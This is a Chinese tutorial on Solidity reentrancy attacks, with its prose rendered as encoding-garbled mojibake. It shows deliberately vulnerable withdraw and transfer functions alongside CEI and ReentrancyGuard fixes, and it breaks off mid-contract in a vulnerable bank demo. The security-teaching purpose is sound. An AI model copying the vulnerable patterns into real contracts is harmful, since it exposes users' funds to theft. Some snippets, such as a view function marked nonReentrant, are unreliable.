# é‡å…¥æ”»å‡» (Reentrancy Attack)

## 1. ã€30å­—æ ¸å¿ƒã€‘

**é‡å…¥æ”»å‡»æ˜¯æ”»å‡»è€…åˆ©ç”¨å¤–éƒ¨è°ƒç”¨æ—¶åˆçº¦çŠ¶æ€æœªæ›´æ–°çš„æ—¶é—´çª—å£ï¼Œé€’å½’è°ƒç”¨ææ¬¾å‡½æ•°ç›—å–èµ„é‡‘çš„æ”»å‡»æ–¹å¼ã€‚**

---

## 2. ã€ç¬¬ä¸€æ€§åŸç†ã€‘

### ä»€ä¹ˆæ˜¯ç¬¬ä¸€æ€§åŸç†ï¼Ÿ

**ç¬¬ä¸€æ€§åŸç†**ï¼šå›åˆ°äº‹ç‰©æœ€åŸºæœ¬çš„çœŸç†ï¼Œä»æºå¤´æ€è€ƒé—®é¢˜

### é‡å…¥æ”»å‡»çš„ç¬¬ä¸€æ€§åŸç† ğŸ¯

#### 1. æœ€åŸºç¡€çš„å®šä¹‰

**é‡å…¥æ”»å‡» = åœ¨å¤–éƒ¨è°ƒç”¨å®Œæˆå‰ï¼Œæ”»å‡»è€…å†æ¬¡è¿›å…¥åŒä¸€å‡½æ•°æ‰§è¡Œ**

ä»…æ­¤è€Œå·²ï¼æ²¡æœ‰æ›´åŸºç¡€çš„äº†ã€‚

#### 2. ä¸ºä»€ä¹ˆä¼šå‘ç”Ÿé‡å…¥æ”»å‡»ï¼Ÿ

**æ ¸å¿ƒé—®é¢˜ï¼šæ™ºèƒ½åˆçº¦åœ¨æ‰§è¡Œå¤–éƒ¨è°ƒç”¨æ—¶ï¼Œæ§åˆ¶æƒæš‚æ—¶è½¬ç§»ç»™è¢«è°ƒç”¨åˆçº¦ï¼Œå¦‚æœæ­¤æ—¶çŠ¶æ€æœªæ›´æ–°ï¼Œæ”»å‡»è€…å¯ä»¥é‡æ–°è¿›å…¥åŸå‡½æ•°ã€‚**

è¿™æºäºä»¥å¤ªåŠçš„æ‰§è¡Œæ¨¡å‹ï¼š
1. åˆçº¦Aè°ƒç”¨åˆçº¦Bæ—¶ï¼Œæ‰§è¡Œæƒè½¬ç§»åˆ°B
2. Bå¯ä»¥åœ¨å…¶ä»£ç ä¸­å†æ¬¡è°ƒç”¨Aï¼ˆå›è°ƒï¼‰
3. å¦‚æœAçš„çŠ¶æ€è¿˜æ²¡æ›´æ–°ï¼ŒBçœ‹åˆ°çš„æ˜¯æ—§çŠ¶æ€

#### 3. é‡å…¥æ”»å‡»çš„ä¸‰å±‚ä»·å€¼ï¼ˆä»é˜²å¾¡è§’åº¦ç†è§£ï¼‰

##### ä»·å€¼1ï¼šç†è§£çŠ¶æ€ä¸€è‡´æ€§

**é—®é¢˜**ï¼šåœ¨å¤–éƒ¨è°ƒç”¨æœŸé—´ï¼Œåˆçº¦å¤„äº"ä¸­é—´çŠ¶æ€"ï¼Œä½™é¢å·²è½¬å‡ºä½†è®°å½•æœªæ›´æ–°ã€‚

**ç¤ºä¾‹**ï¼š
```solidity
// å±é™©ä»£ç 
function withdraw() public {
    uint256 balance = balances[msg.sender];
    (bool success, ) = msg.sender.call{value: balance}(""); // å¤–éƒ¨è°ƒç”¨
    balances[msg.sender] = 0; // çŠ¶æ€æ›´æ–°åœ¨å âŒ
}
```

##### ä»·å€¼2ï¼šç†è§£æ§åˆ¶æµè½¬ç§»

**é—®é¢˜**ï¼š`call`ã€`send`ã€`transfer` éƒ½ä¼šå°†æ§åˆ¶æƒäº¤ç»™æ¥æ”¶æ–¹ã€‚

**ç¤ºä¾‹**ï¼š
```solidity
// å½“è½¬è´¦ç»™åˆçº¦åœ°å€æ—¶ï¼Œä¼šè§¦å‘æ¥æ”¶æ–¹çš„ receive() æˆ– fallback()
msg.sender.call{value: amount}(""); // æ¥æ”¶æ–¹å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç 
```

##### ä»·å€¼3ï¼šç†è§£é€’å½’è°ƒç”¨çš„å±å®³

**é—®é¢˜**ï¼šæ”»å‡»è€…å¯ä»¥åœ¨ `receive()` ä¸­å†æ¬¡è°ƒç”¨ `withdraw()`ï¼Œå½¢æˆé€’å½’ã€‚

**ç¤ºä¾‹**ï¼š
```
withdraw() â†’ è½¬è´¦ç»™æ”»å‡»è€… â†’ æ”»å‡»è€…çš„receive() â†’ å†æ¬¡è°ƒç”¨withdraw() â†’ ...
```

#### 4. ä»ç¬¬ä¸€æ€§åŸç†æ¨å¯¼é˜²å¾¡æ–¹æ¡ˆ

**æ¨ç†é“¾ï¼š**

```
1. å‰æï¼šå¤–éƒ¨è°ƒç”¨ä¼šè½¬ç§»æ§åˆ¶æƒ
   â†“
2. æ¨å¯¼ï¼šæ§åˆ¶æƒè½¬ç§»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç 
   â†“
3. æ¨å¯¼ï¼šæ”»å‡»è€…å¯ä»¥å›è°ƒåŸåˆçº¦çš„å‡½æ•°
   â†“
4. æ¨å¯¼ï¼šå¦‚æœçŠ¶æ€æœªæ›´æ–°ï¼Œæ”»å‡»è€…çœ‹åˆ°æ—§ä½™é¢
   â†“
5. æ¨å¯¼ï¼šæ”»å‡»è€…å¯ä»¥åå¤æå–
   â†“
6. é˜²å¾¡æ–¹æ¡ˆ1ï¼šå…ˆæ›´æ–°çŠ¶æ€ï¼Œå†å¤–éƒ¨è°ƒç”¨ï¼ˆCEIæ¨¡å¼ï¼‰
   â†“
7. é˜²å¾¡æ–¹æ¡ˆ2ï¼šä½¿ç”¨äº’æ–¥é”é˜»æ­¢é‡å…¥ï¼ˆReentrancyGuardï¼‰
   â†“
8. é˜²å¾¡æ–¹æ¡ˆ3ï¼šä½¿ç”¨ transfer/sendï¼ˆé™åˆ¶Gasï¼Œä½†ä¸æ¨èï¼‰
```

#### 5. ä¸€å¥è¯æ€»ç»“ç¬¬ä¸€æ€§åŸç†

**é‡å…¥æ”»å‡»çš„æœ¬è´¨æ˜¯"çŠ¶æ€æ›´æ–°æ»åäºå¤–éƒ¨è°ƒç”¨"ï¼Œé˜²å¾¡çš„æ ¸å¿ƒæ˜¯"å…ˆæ›´æ–°çŠ¶æ€ï¼Œåäº¤äº’"æˆ–"ä½¿ç”¨äº’æ–¥é”"ã€‚**

---

## 3. ã€3ä¸ªæ ¸å¿ƒæ¦‚å¿µã€‘

### æ ¸å¿ƒæ¦‚å¿µ1ï¼šå¤–éƒ¨è°ƒç”¨ (External Call) ğŸ“

**ä¸€å¥è¯å®šä¹‰ï¼š** åˆçº¦è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦æˆ–å‘å¤–éƒ¨åœ°å€è½¬è´¦æ—¶ï¼Œæ§åˆ¶æƒæš‚æ—¶è½¬ç§»ç»™æ¥æ”¶æ–¹ã€‚

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ExternalCallDemo {
    // ä¸‰ç§å¤–éƒ¨è°ƒç”¨æ–¹å¼
    
    // 1. call - æœ€çµæ´»ï¼Œå¯ä»¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œè¿”å›æˆåŠŸä¸å¦
    function callMethod(address payable to, uint256 amount) external {
        (bool success, ) = to.call{value: amount}("");
        require(success, "Call failed");
    }
    
    // 2. transfer - å›ºå®š2300 gasï¼Œå¤±è´¥ä¼šrevertï¼ˆä¸æ¨èï¼Œå¯èƒ½å› Gasä¸è¶³å¤±è´¥ï¼‰
    function transferMethod(address payable to, uint256 amount) external {
        to.transfer(amount);
    }
    
    // 3. send - å›ºå®š2300 gasï¼Œè¿”å›boolï¼ˆä¸æ¨èï¼‰
    function sendMethod(address payable to, uint256 amount) external {
        bool success = to.send(amount);
        require(success, "Send failed");
    }
}
```

**è¯¦ç»†è§£é‡Šï¼š**

å½“ä½¿ç”¨ `call` å‘é€ETHæ—¶ï¼š
1. å¦‚æœæ¥æ”¶æ–¹æ˜¯EOAï¼ˆæ™®é€šè´¦æˆ·ï¼‰ï¼Œç›´æ¥è½¬è´¦æˆåŠŸ
2. å¦‚æœæ¥æ”¶æ–¹æ˜¯åˆçº¦ï¼Œä¼šè§¦å‘å…¶ `receive()` æˆ– `fallback()` å‡½æ•°
3. æ¥æ”¶æ–¹åˆçº¦å¯ä»¥åœ¨è¿™äº›å‡½æ•°ä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼ŒåŒ…æ‹¬å›è°ƒå‘é€æ–¹

**åœ¨æ™ºèƒ½åˆçº¦å¼€å‘ä¸­çš„åº”ç”¨ï¼š**

```solidity
// æ¥æ”¶ETHçš„åˆçº¦
contract Receiver {
    event Received(address sender, uint256 amount);
    
    // å½“æ”¶åˆ°çº¯ETHè½¬è´¦æ—¶è§¦å‘
    receive() external payable {
        emit Received(msg.sender, msg.value);
        // æ”»å‡»è€…å¯ä»¥åœ¨è¿™é‡Œæ‰§è¡Œæ¶æ„ä»£ç 
    }
    
    // å½“è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°æˆ–å‘é€ETHæ—¶dataä¸ä¸ºç©º
    fallback() external payable {
        emit Received(msg.sender, msg.value);
    }
}
```

---

### æ ¸å¿ƒæ¦‚å¿µ2ï¼šçŠ¶æ€æ›´æ–°æ—¶æœº â°

**ä¸€å¥è¯å®šä¹‰ï¼š** çŠ¶æ€å˜é‡çš„æ›´æ–°å¿…é¡»åœ¨å¤–éƒ¨è°ƒç”¨ä¹‹å‰å®Œæˆï¼Œå¦åˆ™æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ—§çŠ¶æ€é‡å¤æ“ä½œã€‚

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract StateUpdateTiming {
    mapping(address => uint256) public balances;
    
    // âŒ é”™è¯¯ï¼šå…ˆè½¬è´¦ï¼Œåæ›´æ–°çŠ¶æ€ï¼ˆæœ‰é‡å…¥æ¼æ´ï¼‰
    function withdrawUnsafe() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        
        // å±é™©ï¼šè½¬è´¦æ—¶çŠ¶æ€è¿˜æ²¡æ›´æ–°
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        // çŠ¶æ€æ›´æ–°å¤ªæ™šäº†ï¼æ”»å‡»è€…å·²ç»å¯ä»¥é‡å…¥
        balances[msg.sender] = 0;
    }
    
    // âœ… æ­£ç¡®ï¼šå…ˆæ›´æ–°çŠ¶æ€ï¼Œåè½¬è´¦ï¼ˆCEIæ¨¡å¼ï¼‰
    function withdrawSafe() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        
        // å…ˆæ›´æ–°çŠ¶æ€
        balances[msg.sender] = 0;
        
        // åè½¬è´¦ï¼ˆå³ä½¿é‡å…¥ï¼Œä½™é¢å·²ç»æ˜¯0ï¼‰
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }
}
```

**è¯¦ç»†è§£é‡Šï¼š**

çŠ¶æ€æ›´æ–°æ—¶æœºå†³å®šäº†åˆçº¦æ˜¯å¦å®¹æ˜“è¢«é‡å…¥æ”»å‡»ï¼š

| æ¨¡å¼ | é¡ºåº | å®‰å…¨æ€§ |
|------|------|--------|
| å…ˆäº¤äº’åæ›´æ–° | call â†’ çŠ¶æ€æ›´æ–° | âŒ å±é™© |
| å…ˆæ›´æ–°åäº¤äº’ | çŠ¶æ€æ›´æ–° â†’ call | âœ… å®‰å…¨ |

**åœ¨æ™ºèƒ½åˆçº¦å¼€å‘ä¸­çš„åº”ç”¨ï¼š**

ä»»ä½•æ¶‰åŠèµ„é‡‘è½¬ç§»çš„å‡½æ•°éƒ½åº”éµå¾ª"å…ˆæ›´æ–°çŠ¶æ€ï¼Œåäº¤äº’"çš„åŸåˆ™ã€‚

---

### æ ¸å¿ƒæ¦‚å¿µ3ï¼šReentrancyGuardï¼ˆäº’æ–¥é”ï¼‰ğŸ”’

**ä¸€å¥è¯å®šä¹‰ï¼š** ä½¿ç”¨çŠ¶æ€å˜é‡ä½œä¸ºé”ï¼Œé˜»æ­¢å‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«å†æ¬¡è°ƒç”¨ã€‚

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ç®€åŒ–ç‰ˆ ReentrancyGuard
contract ReentrancyGuard {
    uint256 private _status;
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    
    constructor() {
        _status = NOT_ENTERED;
    }
    
    modifier nonReentrant() {
        require(_status != ENTERED, "ReentrancyGuard: reentrant call");
        _status = ENTERED;
        _;
        _status = NOT_ENTERED;
    }
}

// ä½¿ç”¨ ReentrancyGuard
contract SecureVault is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // ä½¿ç”¨ nonReentrant ä¿®é¥°ç¬¦ä¿æŠ¤
    function withdraw() external nonReentrant {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        
        // å³ä½¿è¿™é‡ŒçŠ¶æ€æ›´æ–°åœ¨åï¼Œä¹Ÿä¸ä¼šè¢«é‡å…¥
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;
    }
}
```

**è¯¦ç»†è§£é‡Šï¼š**

ReentrancyGuard çš„å·¥ä½œåŸç†ï¼š
1. å‡½æ•°å…¥å£ï¼šæ£€æŸ¥é”çŠ¶æ€ï¼Œå¦‚æœå·²é”å®šåˆ™revert
2. è·å–é”ï¼šå°†çŠ¶æ€è®¾ä¸º ENTERED
3. æ‰§è¡Œå‡½æ•°ä½“
4. é‡Šæ”¾é”ï¼šå°†çŠ¶æ€è®¾ä¸º NOT_ENTERED

**OpenZeppelin å®ç°ï¼š**

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MyContract is ReentrancyGuard {
    function sensitiveFunction() external nonReentrant {
        // å—ä¿æŠ¤çš„ä»£ç 
    }
}
```

---

## 4. ã€æœ€å°å¯ç”¨ã€‘

æŒæ¡ä»¥ä¸‹å†…å®¹ï¼Œå°±èƒ½é˜²æ­¢80%çš„é‡å…¥æ”»å‡»ï¼š

### 4.1 éµå¾ª CEI æ¨¡å¼ï¼ˆChecks-Effects-Interactionsï¼‰

```solidity
function withdraw() external {
    // 1. Checksï¼ˆæ£€æŸ¥ï¼‰
    uint256 balance = balances[msg.sender];
    require(balance > 0, "No balance");
    
    // 2. Effectsï¼ˆæ•ˆæœ/çŠ¶æ€æ›´æ–°ï¼‰
    balances[msg.sender] = 0;
    
    // 3. Interactionsï¼ˆäº¤äº’/å¤–éƒ¨è°ƒç”¨ï¼‰
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Transfer failed");
}
```

### 4.2 ä½¿ç”¨ ReentrancyGuard

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MyVault is ReentrancyGuard {
    function withdraw() external nonReentrant {
        // ä½ çš„ææ¬¾é€»è¾‘
    }
}
```

### 4.3 è¯†åˆ«å±é™©æ¨¡å¼

```solidity
// âŒ å±é™©ï¼šå¤–éƒ¨è°ƒç”¨åä¿®æ”¹çŠ¶æ€
function bad() external {
    msg.sender.call{value: amount}("");
    balances[msg.sender] -= amount;
}

// âŒ å±é™©ï¼šå¾ªç¯ä¸­å¤–éƒ¨è°ƒç”¨
function bad2(address[] calldata recipients) external {
    for (uint i = 0; i < recipients.length; i++) {
        recipients[i].call{value: 1 ether}("");  // å¯èƒ½è¢«æ”»å‡»
    }
}
```

### 4.4 å®¡è®¡æ¸…å•

åœ¨éƒ¨ç½²å‰æ£€æŸ¥ï¼š
- [ ] æ‰€æœ‰å¤–éƒ¨è°ƒç”¨å‰æ˜¯å¦å·²æ›´æ–°çŠ¶æ€ï¼Ÿ
- [ ] æ˜¯å¦ä½¿ç”¨äº† ReentrancyGuardï¼Ÿ
- [ ] æ˜¯å¦æœ‰è·¨å‡½æ•°é‡å…¥é£é™©ï¼Ÿ

**è¿™äº›çŸ¥è¯†è¶³ä»¥ï¼š**
- âœ… ç¼–å†™é˜²é‡å…¥çš„ææ¬¾å‡½æ•°
- âœ… ä½¿ç”¨ OpenZeppelin çš„å®‰å…¨ç»„ä»¶
- âœ… åœ¨ä»£ç å®¡è®¡ä¸­è¯†åˆ«é‡å…¥æ¼æ´
- âœ… ç†è§£å†å²ä¸Šè‘—åçš„é‡å…¥æ”»å‡»äº‹ä»¶

---

## 5. ã€1ä¸ªç±»æ¯”ã€‘

### ç±»æ¯”1ï¼šé‡å…¥æ”»å‡» ğŸ§

#### ç”Ÿæ´»åœºæ™¯ç±»æ¯”ï¼šé‡å…¥æ”»å‡» = ATMå–æ¬¾æœºæ¼æ´

æƒ³è±¡ä¸€ä¸ªæœ‰æ¼æ´çš„ATMå–æ¬¾æœºï¼š

**æ­£å¸¸æµç¨‹ï¼š**
1. æ’å¡ â†’ è¾“å…¥é‡‘é¢ â†’ å‡ºé’ â†’ æ›´æ–°ä½™é¢ â†’ é€€å¡

**æœ‰æ¼æ´çš„æµç¨‹ï¼š**
1. æ’å¡ â†’ è¾“å…¥é‡‘é¢1000å…ƒ â†’ å‡ºé’
2. åœ¨æ›´æ–°ä½™é¢å‰ï¼Œä½ å¿«é€Ÿå†æŒ‰ä¸€æ¬¡å–æ¬¾
3. ATMè¿˜æ˜¾ç¤ºåŸä½™é¢ï¼Œç»§ç»­å‡ºé’
4. é‡å¤æ“ä½œï¼Œç›´åˆ°ATMæ²¡é’±

**å¯¹åº”é‡å…¥æ”»å‡»ï¼š**
- **ATM** = æ™ºèƒ½åˆçº¦
- **å–æ¬¾æŒ‰é’®** = withdraw() å‡½æ•°
- **å‡ºé’** = msg.sender.call{value: balance}("")
- **æ›´æ–°ä½™é¢** = balances[msg.sender] = 0
- **æ¼æ´** = å‡ºé’åæ‰æ›´æ–°ä½™é¢

**ä¸¾ä¾‹ï¼š**

```
æ”»å‡»è€…å­˜å…¥ 1 ETH
â†“
è°ƒç”¨ withdraw()
â†“
åˆçº¦è½¬è´¦ 1 ETHï¼ˆè§¦å‘æ”»å‡»è€…çš„ receive()ï¼‰
â†“
æ”»å‡»è€…åœ¨ receive() ä¸­å†æ¬¡è°ƒç”¨ withdraw()
â†“
åˆçº¦å†æ¬¡è½¬è´¦ 1 ETHï¼ˆå› ä¸ºä½™é¢è¿˜æ²¡æ›´æ–°ï¼‰
â†“
é‡å¤...ç›´åˆ°åˆçº¦æ²¡é’±
```

---

#### å‰ç«¯é¢†åŸŸç±»æ¯”ï¼šé‡å…¥æ”»å‡» = ç«æ€æ¡ä»¶/é‡å¤æäº¤

å¦‚æœä½ åšè¿‡å‰ç«¯å¼€å‘ï¼Œé‡å…¥ç±»ä¼¼äº**æŒ‰é’®é‡å¤ç‚¹å‡»**é—®é¢˜ï¼š

```javascript
// âŒ æœ‰æ¼æ´çš„å‰ç«¯ä»£ç 
async function handleWithdraw() {
    const response = await fetch('/api/withdraw', {
        method: 'POST',
        body: JSON.stringify({ amount: balance })
    });
    
    // ç½‘ç»œè¯·æ±‚è¿˜æ²¡è¿”å›ï¼Œç”¨æˆ·åˆç‚¹äº†ä¸€æ¬¡
    // æœåŠ¡å™¨å¯èƒ½å¤„ç†ä¸¤æ¬¡ææ¬¾è¯·æ±‚
    
    if (response.ok) {
        setBalance(0);  // çŠ¶æ€æ›´æ–°å¤ªæ™š
    }
}

// âœ… ä¿®å¤ï¼šç¦ç”¨æŒ‰é’® + ä¹è§‚æ›´æ–°
async function handleWithdrawSafe() {
    setIsLoading(true);  // å…ˆç¦ç”¨æŒ‰é’®
    setBalance(0);        // ä¹è§‚æ›´æ–°çŠ¶æ€ï¼ˆç±»ä¼¼CEIçš„Effectsï¼‰
    
    try {
        await fetch('/api/withdraw', { method: 'POST' });
    } catch (error) {
        setBalance(previousBalance);  // å¤±è´¥åˆ™å›æ»š
    } finally {
        setIsLoading(false);
    }
}
```

**å¯¹åº”Solidityä»£ç ï¼š**

```solidity
// âŒ æœ‰æ¼æ´çš„åˆçº¦ï¼ˆç±»ä¼¼å‰ç«¯æ²¡ç¦ç”¨æŒ‰é’®ï¼‰
function withdraw() external {
    (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
    balances[msg.sender] = 0;  // çŠ¶æ€æ›´æ–°å¤ªæ™š
}

// âœ… ä¿®å¤æ–¹æ¡ˆ1ï¼šCEIæ¨¡å¼ï¼ˆç±»ä¼¼å‰ç«¯ä¹è§‚æ›´æ–°ï¼‰
function withdrawCEI() external {
    uint256 amount = balances[msg.sender];
    balances[msg.sender] = 0;  // å…ˆæ›´æ–°çŠ¶æ€
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
}

// âœ… ä¿®å¤æ–¹æ¡ˆ2ï¼šReentrancyGuardï¼ˆç±»ä¼¼å‰ç«¯ç¦ç”¨æŒ‰é’®ï¼‰
function withdrawGuarded() external nonReentrant {
    // è¢« nonReentrant "é”ä½"ï¼Œæ— æ³•é‡å¤è°ƒç”¨
}
```

---

### ç±»æ¯”æ€»ç»“è¡¨

| é‡å…¥æ”»å‡»æ¦‚å¿µ | ç”Ÿæ´»åœºæ™¯ç±»æ¯” | å‰ç«¯é¢†åŸŸç±»æ¯” | æ ¸å¿ƒç›¸ä¼¼æ€§ |
|-------------|-------------|-------------|-----------|
| **å¤–éƒ¨è°ƒç”¨** | ATMå‡ºé’ | fetch APIè¯·æ±‚ | æ§åˆ¶æƒè½¬ç§»ï¼Œç­‰å¾…å“åº” |
| **çŠ¶æ€æ›´æ–°** | æ›´æ–°è´¦æˆ·ä½™é¢ | setStateæ›´æ–°UI | è®°å½•å˜åŒ– |
| **é‡å…¥** | å¿«é€Ÿé‡å¤æŒ‰å–æ¬¾é”® | ç”¨æˆ·é‡å¤ç‚¹å‡»æŒ‰é’® | åœ¨çŠ¶æ€æ›´æ–°å‰å†æ¬¡æ“ä½œ |
| **CEIæ¨¡å¼** | å…ˆæ‰£æ¬¾å†å‡ºé’ | ä¹è§‚æ›´æ–° + è¯·æ±‚ | å…ˆæ”¹çŠ¶æ€åäº¤äº’ |
| **ReentrancyGuard** | å–æ¬¾æ—¶é”å®šå±å¹• | æŒ‰é’®loadingç¦ç”¨ | é˜»æ­¢é‡å¤æ“ä½œ |
| **æ”»å‡»è€…** | å‘ç°æ¼æ´çš„åäºº | æ¶æ„è„šæœ¬ | åˆ©ç”¨æ—¶é—´çª—å£ |

---

## 6. ã€åç›´è§‰ç‚¹ã€‘

### è¯¯åŒº1ï¼šä½¿ç”¨ transfer() å°±èƒ½é˜²æ­¢é‡å…¥ âŒ

**ä¸ºä»€ä¹ˆé”™ï¼Ÿ**

å¾ˆå¤šäººè®¤ä¸º `transfer()` åªç»™ 2300 gasï¼Œä¸å¤Ÿæ‰§è¡Œå¤æ‚é€»è¾‘ï¼Œæ‰€ä»¥å®‰å…¨ã€‚

**å®é™…æƒ…å†µï¼š**
- 2300 gas ç¡®å®é™åˆ¶äº†æ¥æ”¶æ–¹çš„æ“ä½œ
- ä½† EIP-1884 åï¼ŒæŸäº›æ“ä½œçš„ gas æˆæœ¬å˜åŒ–äº†
- æœªæ¥çš„ç¡¬åˆ†å‰å¯èƒ½å†æ¬¡æ”¹å˜ gas æˆæœ¬
- å¦‚æœæ¥æ”¶æ–¹æ˜¯åˆçº¦ï¼Œå¯èƒ½å›  gas ä¸è¶³è€Œå¤±è´¥

**ä¸ºä»€ä¹ˆäººä»¬å®¹æ˜“è¿™æ ·é”™ï¼Ÿ**

æ—©æœŸæ•™ç¨‹æ¨è `transfer()` ä½œä¸º"å®‰å…¨"é€‰é¡¹ï¼Œè¿™åœ¨å½“æ—¶æ˜¯æ­£ç¡®çš„ï¼Œä½†ç°åœ¨å·²è¿‡æ—¶ã€‚

**æ­£ç¡®ç†è§£ï¼š**

```solidity
// âŒ ä¸æ¨èï¼šä¾èµ– transfer çš„ gas é™åˆ¶
function withdrawOld() external {
    payable(msg.sender).transfer(balances[msg.sender]);
    balances[msg.sender] = 0;
}

// âœ… æ¨èï¼šä½¿ç”¨ CEI æ¨¡å¼ + call
function withdrawModern() external {
    uint256 amount = balances[msg.sender];
    balances[msg.sender] = 0;  // å…ˆæ›´æ–°çŠ¶æ€
    
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

---

### è¯¯åŒº2ï¼šåªæœ‰ withdraw å‡½æ•°ä¼šè¢«é‡å…¥ âŒ

**ä¸ºä»€ä¹ˆé”™ï¼Ÿ**

é‡å…¥æ”»å‡»ä¸ä»…é™äºææ¬¾å‡½æ•°ï¼Œä»»ä½•åœ¨å¤–éƒ¨è°ƒç”¨åä¿®æ”¹çŠ¶æ€çš„å‡½æ•°éƒ½å¯èƒ½è¢«æ”»å‡»ã€‚

**å®é™…æƒ…å†µï¼š**
- **è·¨å‡½æ•°é‡å…¥**ï¼šæ”»å‡»è€…å¯ä»¥åœ¨å›è°ƒä¸­è°ƒç”¨å…¶ä»–å‡½æ•°
- **è·¨åˆçº¦é‡å…¥**ï¼šæ”»å‡»è€…å¯ä»¥åœ¨å›è°ƒä¸­è°ƒç”¨å…¶ä»–åˆçº¦
- **åªè¯»é‡å…¥**ï¼šæ”»å‡»è€…å¯ä»¥åœ¨å›è°ƒä¸­è¯»å–ä¸ä¸€è‡´çš„çŠ¶æ€

**ä¸ºä»€ä¹ˆäººä»¬å®¹æ˜“è¿™æ ·é”™ï¼Ÿ**

The DAO æ”»å‡»çš„ç»å…¸ä¾‹å­æ˜¯ææ¬¾å‡½æ•°ï¼Œå¯¼è‡´äººä»¬åªå…³æ³¨ withdrawã€‚

**æ­£ç¡®ç†è§£ï¼š**

```solidity
contract VulnerableBank {
    mapping(address => uint256) public balances;
    uint256 public totalDeposits;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }
    
    // âŒ è·¨å‡½æ•°é‡å…¥æ¼æ´
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        
        // æ”»å‡»è€…çš„ receive() å¯ä»¥è°ƒç”¨ transfer()
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        
        balances[msg.sender] = 0;
        totalDeposits -= amount;
    }
    
    // æ”»å‡»è€…å¯ä»¥åœ¨ withdraw é‡å…¥æ—¶è°ƒç”¨æ­¤å‡½æ•°
    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount);  // æ£€æŸ¥æ—§ä½™é¢ï¼Œé€šè¿‡ï¼
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
```

---

### è¯¯åŒº3ï¼šåªæ£€æŸ¥å•æ¬¡é‡å…¥å°±å¤Ÿäº† âŒ

**ä¸ºä»€ä¹ˆé”™ï¼Ÿ**

æŸäº›å¤æ‚çš„ DeFi åè®®å­˜åœ¨"åªè¯»é‡å…¥"æ¼æ´ï¼Œå³ä½¿ä¸ä¿®æ”¹çŠ¶æ€ï¼Œè¯»å–ä¸ä¸€è‡´çš„çŠ¶æ€ä¹Ÿå¯èƒ½è¢«åˆ©ç”¨ã€‚

**å®é™…æƒ…å†µï¼š**

2023å¹´çš„ Curve Finance æ”»å‡»å°±åˆ©ç”¨äº†åªè¯»é‡å…¥ï¼š
1. æ”»å‡»è€…åœ¨å›è°ƒä¸­è¯»å–ä»·æ ¼é¢„è¨€æœº
2. æ­¤æ—¶æ± å­çš„ä½™é¢å·²æ›´æ–°ï¼Œä½†ä»·æ ¼è®¡ç®—è¿˜æ˜¯æ—§å€¼
3. æ”»å‡»è€…åˆ©ç”¨ä»·æ ¼å·®å¥—åˆ©

**ä¸ºä»€ä¹ˆäººä»¬å®¹æ˜“è¿™æ ·é”™ï¼Ÿ**

ä¼ ç»Ÿé‡å…¥æ”»å‡»å…³æ³¨"é‡å¤å†™å…¥"ï¼Œè€Œåªè¯»é‡å…¥å…³æ³¨"è¯»å–ä¸ä¸€è‡´çŠ¶æ€"ã€‚

**æ­£ç¡®ç†è§£ï¼š**

```solidity
// âŒ åªè¯»é‡å…¥é£é™©
contract VulnerableOracle {
    uint256 public price;
    uint256 public reserve;
    
    function swap() external {
        // æ›´æ–°å‚¨å¤‡
        reserve -= amount;
        
        // å¤–éƒ¨è°ƒç”¨ï¼ˆæ”»å‡»è€…å¯ä»¥åœ¨è¿™é‡Œè¯»å– priceï¼‰
        (bool success, ) = msg.sender.call{value: amount}("");
        
        // æ›´æ–°ä»·æ ¼ï¼ˆå¤ªæ™šäº†ï¼ï¼‰
        price = calculatePrice();
    }
}

// âœ… ä¿®å¤ï¼šä½¿ç”¨å…¨å±€é‡å…¥é”
contract SafeOracle is ReentrancyGuard {
    function swap() external nonReentrant {
        // æ‰€æœ‰æ“ä½œéƒ½åœ¨é”å†…
    }
    
    function getPrice() external view nonReentrant returns (uint256) {
        // è¯»å–å‡½æ•°ä¹ŸåŠ é”
    }
}
```

---

## 7. ã€å®æˆ˜ä»£ç ã€‘

### åœºæ™¯1ï¼šæ¼æ´åˆçº¦æ¼”ç¤º

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ===== 1. æœ‰æ¼æ´çš„é“¶è¡Œåˆçº¦ =====
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    // å­˜æ¬¾
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // âŒ æœ‰é‡å…¥æ¼æ´çš„ææ¬¾å‡½æ•°
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");
        
        // å±é™©ï¼šå…ˆè½¬è´¦
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        
